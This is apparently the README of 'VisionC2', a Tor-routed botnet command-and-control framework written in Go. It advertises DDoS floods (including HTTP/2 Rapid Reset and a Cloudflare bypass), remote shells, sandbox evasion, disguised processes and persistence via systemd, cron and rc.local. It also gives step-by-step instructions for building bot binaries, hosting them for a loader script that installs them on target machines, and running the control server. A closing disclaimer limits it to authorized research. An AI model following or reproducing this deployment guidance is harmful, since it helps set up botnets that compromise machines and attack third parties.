<div align="center">

# VisionC2

### Dual-Encrypted, Tor-Routed Botnet C2 Framework

[![Go](https://img.shields.io/badge/Go-1.24+-00ADD8?style=for-the-badge&logo=go&logoColor=white)](https://go.dev)
[![Platform](https://img.shields.io/badge/Platform-Linux-009688?style=for-the-badge&logo=linux&logoColor=white)](README.md)
[![Architectures](https://img.shields.io/badge/Architectures-14-blueviolet?style=for-the-badge)](README.md#deploying-bots)
[![Changelog](https://img.shields.io/badge/Changelog-Docs-f59e0b?style=for-the-badge)](Docs/CHANGELOG.md)

TLS 1.3 + AES-256 encrypted C2 with Tor hidden service web panel, 10 DDoS attack vectors, remote shells, SOCKS5 proxy relay, and multi-arch bot binaries spanning 14 Linux architectures.

[Video Showcasing Full Features + Installation](https://www.youtube.com/watch?v=KkIg24KwpB0)

<br>

<img src="https://github.com/user-attachments/assets/e6bbfd83-725f-4881-8b9d-c6be45b88f27" alt="VisionC2 Tor Panel" width="100%">

</div>

<br>

## Highlights

<table>
<tr>
<td width="50%">

**3 Control Interfaces**
Tor hidden service web panel (works from any browser without clearnet exposure), interactive Go TUI, or Telnet CLI. RBAC with 4 permission tiers.

</td>
<td width="50%">

**10 Attack Vectors**
L4: UDP/TCP/SYN/ACK/GRE/DNS floods. L7: HTTP/HTTPS request floods, Cloudflare bypass, HTTP/2 Rapid Reset (CVE-2023-44487). Proxy support on all L7 methods.

</td>
</tr>
<tr>
<td width="50%">

**Encrypted Transport**
TLS 1.3 over port 443 with AES-256-CTR config encryption. 6-layer C2 address obfuscation. HMAC registration with MD5 challenge-response.

</td>
<td width="50%">

**Stealth & Persistence**
40+ VM/sandbox detection signatures, custom UPX packing, disguised process names. Persistence via systemd, cron watchdog, and rc.local.

</td>
</tr>
</table>

---

## Quick Start

### Dependencies

```bash
sudo apt update && apt install -y openssl git wget gcc python3 screen tor

# Install Go 1.24+
wget https://go.dev/dl/go1.24.1.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.24.1.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
```

**Minimum:** 512MB RAM, 1GB storage, port 443 open
**Recommended:** Ubuntu 22.04+, 2GB+ RAM

### Setup

```bash
git clone https://github.com/Syn2Much/VisionC2.git && cd VisionC2
python3 setup.py   # Select [1] Full Setup
```

The wizard prompts for C2 address, admin port (default 420), and TLS cert details. Outputs:
- `bins/` — 14 bot binaries (multi-arch)
- `cnc/certificates/` — server.crt + server.key
- `server` — CNC binary
- `setup_config.txt` — config summary

To change C2 address later: `python3 setup.py` → option [2]. Redeploy bots afterward.

### Starting the CNC

```bash
./server              # interactive launcher
./server --tui        # TUI mode only
./server --split      # Telnet mode on port 420
./server --daemon     # Telnet headless
```

Run in background: `screen -S vision ./server` (detach with Ctrl+A, D).

---

## Architecture

```
┌─────────────┐       TLS 1.3 / 443       ┌─────────────┐
│   Operator   │◄─── Tor Hidden Service ───►│  CNC Server │
│  (Browser /  │                            │   cnc/      │
│   TUI/Tel)   │                            └──────┬──────┘
└─────────────┘                                    │
                                          TLS 1.3 / 443
                                                   │
                          ┌────────────────────────┼────────────────────────┐
                          │                        │                        │
                    ┌─────┴─────┐            ┌─────┴─────┐            ┌─────┴─────┐
                    │    Bot    │            │    Bot    │            │   Bot     │
                    │  (arm64)  │            │  (x86_64) │            │  (mips)   │
                    └───────────┘            └───────────┘            └───────────┘
```

| Component | Path | Role |
|:----------|:-----|:-----|
| **CNC** | `cnc/` | C2 server — TLS listener on 443 for bots, embedded Tor service for web panel, TUI + Telnet CLI, RBAC via `users.json` |
| **Bot** | `bot/` | Agent binary — TLS 1.3 connection, config decoding, sandbox evasion, persistence install, shell access |
| **Relay** | `relay/` | SOCKS5 relay — bots connect via TLS, users connect on SOCKS5 port, disposable infrastructure |
| **Tools** | `tools/` | Build script, crypto utilities, cleanup helpers |

---

## Deploying Bots

Host the compiled binaries on a separate VPS:

```bash
sudo apt install -y apache2
sudo cp bins/* /var/www/html/bins/
sudo systemctl start apache2
```

Edit `loader.sh` line 3 with your server IP:

```bash
SRV="http://<your-server-ip>/bins"
```

The loader auto-detects target architecture and downloads the matching binary from the 14 available variants.

---

## Attack Methods

### Layer 4 (Network/Transport)

| Method | Description |
|:-------|:------------|
| **UDP Flood** | High-volume 1024-byte payloads |
| **TCP Flood** | Connection table exhaustion |
| **SYN Flood** | Randomized source ports (raw TCP) |
| **ACK Flood** | ACK packet spam (raw TCP) |
| **GRE Flood** | Protocol 47, max payload |
| **DNS Flood** | Randomized query types, reflection |

### Layer 7 (Application)

| Method | Description |
|:-------|:------------|
| **HTTP Flood** | GET/POST with randomized headers + user-agents |
| **HTTPS/TLS Flood** | TLS handshake exhaustion + burst requests |
| **CF Bypass** | Cloudflare bypass via session/cookie reuse + fingerprinting |
| **Rapid Reset** | HTTP/2 exploit (CVE-2023-44487), HEADERS + RST_STREAM |

All L7 methods support HTTP + SOCKS5 proxy integration.

---

## CNC Interfaces

<img src="https://github.com/user-attachments/assets/b979ffcc-082f-47be-ac8d-206c751fa8f9" alt="VisionC2 TUI" width="100%">

| Interface | Access | Use Case |
|:----------|:-------|:---------|
| **Tor Web Panel** | `.onion` address in any browser | Full GUI — attack builder, shell, bot management, SOCKS control, activity log |
| **Go TUI** | `./server --tui` | Interactive terminal dashboard with live bot feed |
| **Telnet CLI** | `./server --split` (port 420) | Lightweight remote access, scriptable |

---

## Documentation

| Document | Description |
|:---------|:------------|
| [`ARCHITECTURE.md`](Docs/ARCHITECTURE.md) | System design, encryption layers, protocol details |
| [`CHANGELOG.md`](Docs/CHANGELOG.md) | Full version history |
| [`COMMANDS.md`](Docs/COMMANDS.md) | Complete command reference |
| [`SETUP.md`](Docs/SETUP.md) | Installation and configuration guide |
| [`PROXY.md`](Docs/PROXY.md) | SOCKS5 relay deployment |

---

## Troubleshooting

<details>
<summary><b>"go: command not found" or wrong Go version</b></summary>

```bash
export PATH=$PATH:/usr/local/go/bin
go version  # Should show 1.24+
```
</details>

<details>
<summary><b>"Permission denied" when starting server on port 443</b></summary>

```bash
sudo setcap 'cap_net_bind_service=+ep' ./server
```
</details>

<details>
<summary><b>Bots won't connect to C2</b></summary>

- Check firewall: `sudo ufw allow 443/tcp`
- Verify C2 address in `setup_config.txt` matches your server
- Test TLS: `openssl s_client -connect YOUR_IP:443`
- Check server logs for connection attempts
</details>

<details>
<summary><b>"No such file or directory" during build</b></summary>

```bash
sudo apt install -y build-essential gcc python3-dev
```
</details>

<details>
<summary><b>Relay server won't start</b></summary>

- Check if ports 9001/1080 are available: `netstat -tulpn | grep :9001`
- Verify permissions: `chmod +x relay_server`
</details>

---

## Legal Disclaimer

For authorized security research and educational purposes only. Usage against targets without prior consent is illegal. Developer assumes no liability for misuse.

---

<div align="center">

**Syn2Much** — [hell@sinners.city](mailto:hell@sinners.city) | [@synacket](https://x.com/synacket)

</div>
